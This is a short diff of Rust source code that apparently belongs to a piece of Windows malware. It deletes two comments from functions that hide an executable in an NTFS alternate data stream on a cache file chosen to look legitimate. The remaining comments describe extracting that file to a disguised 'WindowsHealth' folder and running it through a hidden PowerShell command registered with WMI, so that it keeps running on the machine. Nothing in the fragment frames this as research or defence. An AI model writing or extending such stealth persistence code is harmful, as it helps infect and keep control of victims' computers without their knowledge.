@@ -20,7 +20,6 @@ pub fn apply_shadow_persistence() -> Result<(), Box<dyn std::error::Error>> {
 #[cfg(windows)]
 fn backup_to_ads() -> Result<(), Box<dyn std::error::Error>> {
     // 1. Target Host File: C:\ProgramData\Microsoft\Windows\Caches\index.dat
-    // This file looks legit.
     let program_data = std::env::var("ProgramData").unwrap_or("C:\\ProgramData".to_string());
     let cache_dir = PathBuf::from(&program_data).join("Microsoft").join("Windows").join("Caches");
     
@@ -94,7 +93,6 @@ fn register_wmi_persistence() -> Result<(), Box<dyn std::error::Error>> {
     // We need to EXTRACT the binary from ADS and run it.
     // Command: powershell -WindowStyle Hidden -Command "..."
     let program_data = std::env::var("ProgramData").unwrap_or("C:\\ProgramData".to_string());
-    // Hardcoding path for WMI command string simplicity
     let host_path = format!("{}\\Microsoft\\Windows\\Caches\\index.dat", program_data); 
     // We extract to a temp location and run
     let temp_exe = format!("{}\\WindowsHealth\\sys_wmi.exe", program_data); // Reuse our folder
